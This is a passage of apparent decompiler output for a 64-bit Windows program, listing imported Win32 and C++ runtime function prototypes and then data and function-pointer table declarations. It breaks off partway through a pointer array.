// BOOL __stdcall InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision);
// BOOL __stdcall ChangeServiceConfigA(SC_HANDLE hService, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword, LPCSTR lpDisplayName);
// LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegCreateKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// BOOL __stdcall CreateProcessAsUserW(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// BOOL __stdcall SetServiceObjectSecurity(SC_HANDLE hService, SECURITY_INFORMATION dwSecurityInformation, PSECURITY_DESCRIPTOR lpSecurityDescriptor);
// SC_HANDLE __stdcall OpenServiceW(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
// BOOL __stdcall LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
// BOOL __stdcall StartServiceW(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCWSTR *lpServiceArgVectors);
// BOOL __stdcall StartServiceCtrlDispatcherA(const SERVICE_TABLE_ENTRYA *lpServiceStartTable);
// BOOL __stdcall SetServiceStatus(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
// SERVICE_STATUS_HANDLE __stdcall RegisterServiceCtrlHandlerExA(LPCSTR lpServiceName, LPHANDLER_FUNCTION_EX lpHandlerProc, LPVOID lpContext);
// BOOL __stdcall WaitNamedPipeA(LPCSTR lpNamedPipeName, DWORD nTimeOut);
// void __stdcall Sleep(DWORD dwMilliseconds);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall SetEvent(HANDLE hEvent);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// void __stdcall SetLastError(DWORD dwErrCode);
// HANDLE __stdcall GetCurrentProcess();
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW lpVersionInformation);
// BOOL __stdcall ResetEvent(HANDLE hEvent);
// HANDLE __stdcall CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
// DWORD __stdcall GetProcessId(HANDLE Process);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// DWORD __stdcall WaitForMultipleObjects(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// HANDLE __stdcall CreateSemaphoreA(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCSTR lpName);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetTickCount();
// DWORD __stdcall WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
// BOOL __stdcall DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HANDLE __stdcall GetProcessHeap();
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// BOOL __stdcall ReleaseMutex(HANDLE hMutex);
// HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// LONG __stdcall CompareFileTime(const FILETIME *lpFileTime1, const FILETIME *lpFileTime2);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// BOOL __stdcall FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// UINT __stdcall GetSystemDirectoryW(LPWSTR lpBuffer, UINT uSize);
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// BOOL __stdcall CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// DWORD __stdcall GetFileAttributesW(LPCWSTR lpFileName);
// BOOL __stdcall AreFileApisANSI();
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
// BOOL __stdcall QueryPerformanceFrequency(LARGE_INTEGER *lpFrequency);
// HANDLE __stdcall OpenEventA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// DWORD __stdcall WaitForMultipleObjectsEx(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds, BOOL bAlertable);
// BOOL __stdcall ReleaseSemaphore(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// BOOL __stdcall SetWaitableTimer(HANDLE hTimer, const LARGE_INTEGER *lpDueTime, LONG lPeriod, PTIMERAPCROUTINE pfnCompletionRoutine, LPVOID lpArgToCompletionRoutine, BOOL fResume);
// DWORD __stdcall ResumeThread(HANDLE hThread);
// DWORD __stdcall TlsAlloc();
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue);
// BOOL __stdcall TlsFree(DWORD dwTlsIndex);
// HANDLE __stdcall CreateWaitableTimerA(LPSECURITY_ATTRIBUTES lpTimerAttributes, BOOL bManualReset, LPCSTR lpTimerName);
// DWORD __stdcall QueryDosDeviceA(LPCSTR lpDeviceName, LPSTR lpTargetPath, DWORD ucchMax);
// DWORD __stdcall GetLogicalDriveStringsA(DWORD nBufferLength, LPSTR lpBuffer);
// SIZE_T __stdcall VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BOOL __stdcall ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// DWORD __stdcall GetLastError();
// HANDLE __stdcall CreateNamedPipeA(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// BOOL __stdcall GetOverlappedResult(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait);
// BOOL __stdcall DisconnectNamedPipe(HANDLE hNamedPipe);
// BOOL __stdcall ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall VerifyVersionInfoW(LPOSVERSIONINFOEXW lpVersionInformation, DWORD dwTypeMask, DWORDLONG dwlConditionMask);
// ULONGLONG __stdcall VerSetConditionMask(ULONGLONG ConditionMask, DWORD TypeMask, BYTE Condition);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall SystemTimeToFileTime(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::tellg(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::seekg(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::ctype<char>::_Getcat(_QWORD, _QWORD); weak
// __int64 __fastcall std::ctype<char>::toupper(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::operator<<(_QWORD, _QWORD); weak
// __int64 __fastcall Cnd_timedwait(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall Cnd_wait(_QWORD, _QWORD); weak
// __int64 __fastcall Mtx_current_owns(_QWORD); weak
// __int64 __fastcall Cnd_broadcast(_QWORD); weak
// __int64 __fastcall Cnd_destroy(_QWORD); weak
// __int64 __fastcall Cnd_init(_QWORD); weak
// __int64 __fastcall Thrd_sleep(_QWORD); weak
// __int64 Xtime_get_ticks(void); weak
// __int64 __fastcall Xtime_diff_to_millis2(_QWORD, _QWORD); weak
// __int64 __fastcall xtime_get(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::operator>>(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::~basic_ostream<char,std::char_traits<char>>(_QWORD); weak
// __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::basic_ostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD, _QWORD);
// __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD); weak
// __int64 __fastcall std::ws(_QWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::putback(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::read(_QWORD, _QWORD, _QWORD); weak
// void (*__stdcall std::set_new_handler(void (*)(void)))(void); weak
// __int64 __fastcall std::codecvt<wchar_t,char,int>::_Getcat(_QWORD, _QWORD); weak
// struct std::locale::_Locimp *__stdcall static std::locale::_Init(bool); weak
// __int64 __fastcall std::codecvt<wchar_t,char,int>::out(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::codecvt<wchar_t,char,int>::in(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(_QWORD); weak
// __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::seekg(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::_Osfx(_QWORD); weak
// __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Pninc(_QWORD); weak
// bool std::uncaught_exception(void); weak
// void __stdcall std::_Throw_C_error(_DWORD); weak
// __int64 __fastcall Mtx_unlock(_QWORD); weak
// __int64 __fastcall Mtx_lock(_QWORD); weak
// __int64 __fastcall _Mtx_destroy(_QWORD); weak
// __int64 __fastcall Mtx_init(_QWORD, _QWORD); weak
// struct _iobuf *__stdcall std::_Fiopen(const char *, _DWORD, _DWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(_QWORD); weak
// __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::basic_istream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::setstate(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(_QWORD); weak
// __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Init(_QWORD); weak
// __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::setg(_QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::getloc(_QWORD, _QWORD); weak
// __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(_QWORD); weak
// __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD); weak
// void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *); weak
// __int64 __fastcall std::codecvt<char,char,int>::_Getcat(_QWORD, _QWORD); weak
// __int64 __fastcall std::codecvt<char,char,int>::unshift(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// __int64 __fastcall std::codecvt<char,char,int>::in(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// bool std::codecvt_base::always_noconv(std::codecvt_base *__hidden this); weak
// __int64 __cdecl std::locale::_Getgloballocale(_QWORD); weak
// __int64 __fastcall std::locale::id::operator unsigned __int64(_QWORD); weak
// _QWORD std::_Lockit::~_Lockit(std::_Lockit *__hidden this); weak
// _QWORD std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD); weak
// void std::_Pad::_Release(std::_Pad *__hidden this); weak
// void std::_Pad::_Launch(std::_Pad *__hidden this, struct _Thrd_imp_t *); weak
// _QWORD std::_Pad::~_Pad(std::_Pad *__hidden this); weak
// _QWORD std::_Pad::_Pad(std::_Pad *__hidden this); weak
// void __stdcall std::_Throw_Cpp_error(_DWORD); weak
// __int64 __fastcall Thrd_current(_QWORD); weak
// __int64 __fastcall Thrd_equal(_QWORD, _QWORD); weak
// __int64 Thrd_yield(void); weak
// __int64 __fastcall Thrd_join(_QWORD, _QWORD); weak
// const char *__stdcall std::_Winerror_map(_DWORD); weak
// const char *__stdcall std::_Syserror_map(_DWORD); weak
// void __stdcall std::_Xout_of_range(const char *); weak
// void __stdcall std::_Xlength_error(const char *); weak
// void std::_Xbad_alloc(void); weak
// const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *); weak
// char *__cdecl strrchr(const char *Str, int Ch);
// void __stdcall Concurrency::wait(unsigned int); weak
// __int64 __fastcall dtest(_QWORD); weak
// int sprintf_s(char *DstBuf, size_t SizeInBytes, const char *Format, ...);
// double __cdecl modf(double X, double *Y);
// int __cdecl tolower(int C);
// int __cdecl toupper(int C);
// int __cdecl isalpha(int C);
// errno_t __cdecl memmove_s(void *Dst, rsize_t DstSize, const void *Src, rsize_t MaxCount);
// void *__cdecl aligned_malloc(size_t Size, size_t Alignment);
// uintptr_t __cdecl beginthreadex(void *Security, unsigned int StackSize, unsigned int (__stdcall *StartAddress)(void *), void *ArgList, unsigned int InitFlag, unsigned int *ThrdAddr);
// struct tm *__cdecl gmtime64(const __time64_t *Time);
// int __cdecl stricmp(const char *Str1, const char *Str2);
// unsigned int __cdecl wcstoul(const wchar_t *Str, wchar_t **EndPtr, int Radix);
// wchar_t *__cdecl ultow(unsigned int Value, wchar_t *Dest, int Radix);
// struct tm *__cdecl localtime64(const __time64_t *Time);
// int snwprintf(wchar_t *Dest, size_t Count, const wchar_t *Format, ...);
// __int64 __fastcall type_info::operator!=(_QWORD, _QWORD); weak
// __int64 __fastcall type_info::operator==(_QWORD, _QWORD); weak
// _QWORD std::exception::exception(std::exception *__hidden this); weak
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// errno_t __cdecl strncpy_s(char *Dst, rsize_t SizeInBytes, const char *Src, rsize_t MaxCount);
// errno_t __cdecl strncat_s(char *Dst, rsize_t SizeInBytes, const char *Src, rsize_t MaxCount);
// int sprintf(char *Dest, const char *Format, ...);
// void *__cdecl malloc(size_t Size);
// void __cdecl free(void *Memory);
// errno_t __cdecl wcscpy_s(wchar_t *Dst, rsize_t SizeInWords, const wchar_t *Src);
// errno_t __cdecl wcscat_s(wchar_t *Dst, rsize_t SizeInWords, const wchar_t *Src);
// const char *std::exception::what(std::exception *__hidden this); weak
// _QWORD std::exception::~exception(std::exception *__hidden this); weak
// _QWORD std::exception::exception(std::exception *__hidden this, const char *const *, _DWORD); weak
// _QWORD std::exception::exception(std::exception *__hidden this, const char *const *); weak
// _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *); weak
// void __cdecl unlock_file(FILE *File);
// void __cdecl lock_file(FILE *File);
// int __cdecl ungetc(int Ch, FILE *File);
// int __cdecl setvbuf(FILE *File, char *Buf, int Mode, size_t Size);
// size_t __cdecl fwrite(const void *Str, size_t Size, size_t Count, FILE *File);
// int __cdecl fseeki64(FILE *File, __int64 Offset, int Origin);
// int __cdecl fsetpos(FILE *File, const fpos_t *Pos);
// int __cdecl fgetpos(FILE *File, fpos_t *Pos);
// int __cdecl fgetc(FILE *File);
// int __cdecl fflush(FILE *File);
// int __cdecl fclose(FILE *File);
// _QWORD std::bad_cast::bad_cast(std::bad_cast *__hidden this, const char *); weak
// errno_t __cdecl memcpy_s(void *Dst, rsize_t DstSize, const void *Src, rsize_t MaxCount);
// __time64_t __cdecl time64(__time64_t *Time);
// clock_t __cdecl clock();
// errno_t __cdecl mbstowcs_s(size_t *PtNumOfCharConverted, wchar_t *DstBuf, size_t SizeInWords, const char *SrcBuf, size_t MaxCount);
// __int64 Concurrency::details::_CurrentScheduler::_Id(void); weak
// __int64 Concurrency::details::_Context::_Yield(void); weak
// void terminate(void); weak
// void *__cdecl memmove(void *Dst, const void *Src, size_t Size);
// BOOL __stdcall ShellExecuteExA(SHELLEXECUTEINFOA *pExecInfo);
// HRESULT __stdcall SHGetFolderPathW(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPWSTR pszPath);

//-------------------------------------------------------------------------
// Data declarations

char byte_1400081F8 = ''; // weak
char byte_14001E536 = ''; // weak
char byte_140029607 = ''; // weak
char byte_140029829 = ''; // weak
char algn_14002E8CF = ''; // weak
char byte_14002EDC0 = ''; // weak
char byte_14004C2F3 = ''; // weak
char byte_140053057 = ''; // weak
char byte_14006910B = ''; // weak
char byte_1400692BA = ''; // weak
char byte_14006F807 = ''; // weak
_UNKNOWN loc_140097000; // weak
// extern void *std::basic_istream<char,std::char_traits<char>>::`vftable'; weak
// extern _UNKNOWN std::ctype<char>::id; weak
// extern void *std::codecvt<wchar_t,char,int>::`vftable'; weak
// extern _UNKNOWN std::codecvt<wchar_t,char,int>::id; weak
// extern void *std::codecvt_base::`vftable'; weak
// extern void *std::locale::facet::`vftable'; weak
// extern void *std::_Facet_base::`vftable'; weak
// extern void *std::basic_ios<char,std::char_traits<char>>::`vftable'; weak
// extern void *std::ios_base::`vftable'; weak
// extern _UNKNOWN std::codecvt<char,char,int>::id; weak
// extern const __int64 std::_BADOFF; weak
_UNKNOWN loc_1400A27F0; // weak
__int64 (__fastcall *off_1400A2B48)() = &sub_140011D20; // weak
__int64 (__fastcall *off_1400A2B70)(void *) = &sub_140006240; // weak
__int64 (__fastcall *off_1400A2B80)(void *) = &sub_140006210; // weak
__int64 (__fastcall *off_1400A2B88)() = &sub_140007C10; // weak
__int64 (__fastcall *off_1400A2D20)() = &sub_140008890; // weak
__int64 (__fastcall *off_1400A2D38)() = &sub_14007E2C0; // weak
__int64 (__fastcall *off_1400A2D48)() = &sub_140008890; // weak
__int64 (__fastcall *off_1400A2D60)() = &sub_1400088C0; // weak
__int64 (__fastcall *off_1400A2D78)() = &sub_140011D20; // weak
_UNKNOWN unk_1400A2F80; // weak
_UNKNOWN unk_1400A2F84; // weak
_UNKNOWN unk_1400A2F88; // weak
__int64 (__fastcall *off_1400A3108)(void *) = &sub_14000BF50; // weak
__int64 (__fastcall *off_1400A3180)() = &sub_14000BF3C; // weak
_UNKNOWN unk_1400A3188; // weak
_UNKNOWN unk_1400A3218; // weak
__int64 (__fastcall *off_1400A3360)(void *) = &sub_14000E8B0; // weak
__int64 (__fastcall *off_1400A3370[5])() =
{
  &sub_140011D20,
  &sub_14000EB10,
  &sub_140007E30,
  &sub_140009480,
  &sub_140009480
}; // weak
char byte_1400A3400[8] = { '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0' }; // idb
__int64 (__fastcall *off_1400A3408)(void *) = &sub_14000ECB0; // weak
__int64 (__fastcall *off_1400A3440)(void *) = &sub_14000F120; // weak
__int64 (__fastcall *off_1400A34C8[7])() =
{
  &sub_14000F420,
  &sub_14000F430,
  &sub_140011D20,
  &sub_14000F440,
  &sub_140007E30,
  &sub_140009480,
  &sub_140009480
}; // weak
_UNKNOWN loc_1400A3C88; // weak
void *off_1400A3CB0 = &purecall; // weak
void *off_1400A3CB8 = &purecall; // weak
_UNKNOWN loc_1400A3CD0; // weak
__int64 (__fastcall *off_1400A3D00)(void *) = &sub_140011D90; // weak
__int64 (__fastcall *off_1400A3D08)() = &sub_140011BE4; // weak
__int64 (__fastcall *off_1400A3D18)(void *) = &sub_140011CF0; // weak
__int64 (__fastcall *off_1400A3D28)(void *) = &sub_140011BF0; // weak
__int64 (__fastcall *off_1400A3D38[2])() = { &sub_140011B94, &sub_140013108 }; // weak
__int64 (__fastcall *off_1400A3D40)() = &sub_140013108; // weak
_UNKNOWN unk_1400A3D58; // weak
__int64 (__fastcall *off_1400A3D60)(void *) = &sub_140011C70; // weak
__int64 (__fastcall *off_1400A3D68)() = &sub_140011BB0; // weak
__int64 (__fastcall *off_1400A3D78)() = &sub_140013184; // weak
_UNKNOWN unk_1400A3D90; // weak
__int64 (__fastcall *off_1400A3E70)(void *) = &sub_140011CB0; // weak
__int64 (__fastcall *off_1400A3E78)() = &sub_140011BCC; // weak
__int64 (__fastcall *off_1400A3E88)() = &sub_140013260; // weak
_UNKNOWN unk_1400A3EA0; // weak
__int64 (__fastcall *off_1400A4018[2])() = { &sub_14007E2C0, &sub_140014220 }; // weak
__int64 (__fastcall *off_1400A4E20)(void *) = &sub_1400194C0; // weak
__int64 (__fastcall *off_1400A4EF8)(void *) = &sub_1400194F0; // weak
__int64 (__fastcall *off_1400A4F40)(void *) = &sub_1400193E0; // weak
__int64 (__fastcall *off_1400A4F50)() = &sub_14001923C; // weak
__int64 (__fastcall *off_1400A4F58)(void *) = &sub_140019260; // weak
__int64 (__fastcall *off_1400A4F68[2])() = { &sub_1400191BC, &sub_14001C5D4 }; // weak
__int64 (__fastcall *off_1400A4F70)() = &sub_14001C5D4; // weak
_UNKNOWN unk_1400A4F88; // weak
__int64 (__fastcall *off_1400A4F90)(void *) = &sub_140019450; // weak
__int64 (__fastcall *off_1400A4FA0)() = &sub_140019248; // weak
__int64 (__fastcall *off_1400A4FA8)(void *) = &sub_140019320; // weak
__int64 (__fastcall *off_1400A4FB8[2])() = { &sub_140019210, &sub_14001C724 }; // weak
__int64 (__fastcall *off_1400A4FC0)() = &sub_14001C724; // weak
_UNKNOWN unk_1400A4FD8; // weak
__int64 (__fastcall *off_1400A4FE0)() = &sub_140011BD8; // weak
__int64 (__fastcall *off_1400A4FE8)(void *) = &sub_140019360; // weak
__int64 (__fastcall *off_1400A4FF8[2])() = { &sub_140019230, &sub_14001C794 }; // weak
__int64 (__fastcall *off_1400A5000)() = &sub_14001C794; // weak
_UNKNOWN unk_1400A5018; // weak
__int64 (__fastcall *off_1400A5020)(void *) = &sub_1400192E0; // weak
__int64 (__fastcall *off_1400A5030[2])() = { &sub_1400191F4, &sub_14001C6B4 }; // weak
__int64 (__fastcall *off_1400A5038)() = &sub_14001C6B4; // weak
_UNKNOWN unk_1400A5050; // weak
__int64 (__fastcall *off_1400A5058)(void *) = &sub_1400192A0; // weak
__int64 (__fastcall *off_1400A5068[2])() = { &sub_1400191D8, &sub_14001C644 }; // weak
__int64 (__fastcall *off_1400A5070)() = &sub_14001C644; // weak
_UNKNOWN unk_1400A5088; // weak
__int64 (__fastcall *off_1400A5108)(void *) = &sub_1400194F0; // weak
__int64 (__fastcall *off_1400A56B0)() = &sub_1400201B0; // weak
__int64 (__fastcall *off_1400A56D8)(void *) = &sub_140020180; // weak
__int64 (__fastcall *off_1400A5728[2])() = { &sub_140020168, &sub_140020B60 }; // weak
__int64 (__fastcall *off_1400A57A0)(void *) = &sub_140022740; // weak
__int64 (__fastcall *off_1400A57F0[2])() = { &sub_140022728, &sub_1400227E0 }; // weak
void *off_1400A6410 = &purecall; // weak
__int64 (__fastcall *off_1400A6430)(void *) = &sub_140024A70; // weak
__int64 (__fastcall *off_1400A64C0)() = &sub_140089010; // weak
__int64 (__fastcall *off_1400A6528)(void *) = &sub_140024BC0; // weak
__int64 (__fastcall *off_1400A6600)(void *) = &sub_140024BF0; // weak
__int64 (__fastcall *off_1400A66F8)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400A6710)(void *) = &sub_140024AE0; // weak
__int64 (__fastcall *off_1400A6728)(void *) = &sub_140054040; // weak
__int64 (__fastcall *off_1400A6780[7])() =
{
  &sub_140028440,
  &sub_1400523A0,
  &sub_140027150,
  &sub_140051320,
  &sub_140050ED0,
  &sub_140052060,
  &sub_14004F6B0
}; // weak
__int64 (__fastcall *off_1400A67C0[6])() =
{
  &sub_140028450,
  &sub_140025930,
  &sub_140025A10,
  &sub_140027920,
  &sub_1400254E0,
  &sub_140025A70
}; // weak
__int64 (__fastcall *off_1400A67F0)(void *) = &sub_1400249C0; // weak
void *off_1400A6830 = &sub_140055700; // weak
__int64 (__fastcall *off_1400A68D8[11])() =
{
  &sub_1400248DC,
  &sub_14002803C,
  &sub_140025284,
  &sub_1400294B4,
  &sub_1400292B0,
  &sub_140028D74,
  &sub_140028550,
  &sub_140029290,
  &sub_140028934,
  &sub_140028698,
  &sub_140028D9C
}; // weak
_UNKNOWN unk_1400A6930; // weak
__int64 (__fastcall *off_1400A6938)(void *) = &sub_140024CA0; // weak
void *off_1400A6978 = &sub_140055700; // weak
__int64 (__fastcall *off_1400A6A20[11])() =
{
  &sub_140024910,
  &sub_140028050,
  &sub_14002521C,
  &sub_1400294B4,
  &sub_1400292B0,
  &sub_140028D74,
  &sub_140028550,
  &sub_140029290,
  &sub_140028934,
  &sub_140028698,
  &sub_140028D9C
}; // weak
__int64 (__fastcall *off_1400A6A78)(void *) = &sub_140024B10; // weak
__int64 (__fastcall *off_1400A6AB8[11])() =
{
  &sub_1400248FC,
  &sub_140028050,
  &sub_14002521C,
  &sub_1400294B4,
